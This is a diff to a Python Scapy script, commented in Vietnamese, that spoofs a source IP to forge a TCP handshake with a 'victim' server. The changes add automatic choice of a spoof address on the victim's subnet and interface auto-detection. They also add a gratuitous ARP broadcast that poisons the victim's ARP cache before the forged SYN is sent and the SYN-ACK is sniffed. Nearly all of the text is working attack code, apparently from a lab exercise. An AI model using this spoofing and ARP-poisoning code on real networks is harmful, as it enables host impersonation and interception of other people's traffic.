@@ -7,18 +7,25 @@ from scapy.all import *
 
 victim = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
 
-# Neu nguoi dung truyen IP gia mao, dung IP do; neu khong, tu dong tao IP hop ly
-if len(sys.argv) > 2:
+# Neu nguoi dung truyen IP gia mao, dung IP do; neu khong, tu dong tao IP cung subnet
+if len(sys.argv) > 2 and sys.argv[2] != "auto":
     spoof = sys.argv[2]
 else:
-    if victim.startswith("192.168."):
-        # Lay 3 octet dau ghep voi .222 (IP ao trong mang)
+    if victim != "10.0.0.2":
+        # Lay 3 octet dau ghep voi .222 de luon cung subnet voi victim (ho tro 10.x, 172.x, 192.168.x...)
         prefix = ".".join(victim.split(".")[:3])
-        spoof = f"{prefix}.222"
+        last_octet = victim.split(".")[-1]
+        spoof_host = "223" if last_octet == "222" else "222"
+        spoof = f"{prefix}.{spoof_host}"
     else:
         spoof = "10.0.0.77"
 
-iface = sys.argv[3] if len(sys.argv) > 3 else (conf.iface or "eth0")
+# Tu dong phat hien card mang phu hop huong toi victim
+try:
+    auto_iface = conf.route.route(victim)[0]
+except Exception:
+    auto_iface = conf.iface or "eth0"
+iface = sys.argv[3] if len(sys.argv) > 3 else auto_iface
 dport = int(sys.argv[4]) if len(sys.argv) > 4 else 9000
 sport = 12345
 
@@ -46,12 +53,17 @@ def arp_responder():
 arp_thread = threading.Thread(target=arp_responder, daemon=True)
 arp_thread.start()
 
+# Chu dong phat truoc goi ARP thong bao IP gia mao toi Victim de nap san vao cache (chong tre mang Wi-Fi)
+garp = ARP(op=2, hwsrc=my_mac, psrc=spoof, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim)
+sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)/garp, iface=iface, count=2, verbose=0)
+time.sleep(0.3)
+
 print(f"[*] Buoc 1: Bat may lang nghe (sniff) tren card {iface}...")
-sniffer = AsyncSniffer(iface=iface, timeout=5, count=1,
+sniffer = AsyncSniffer(iface=iface, timeout=8, count=1,
                        lfilter=lambda p: p.haslayer(TCP) and p[TCP].dport == sport
                        and (p[TCP].flags & 0x12) == 0x12)
 sniffer.start()
-time.sleep(0.3)
+time.sleep(0.4)
 
 print(f"[*] Buoc 2: Gui goi SYN tu IP gia mao ({spoof}) den Server ({victim}:{dport})...")
 send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="S", seq=1000), iface=iface, verbose=0)
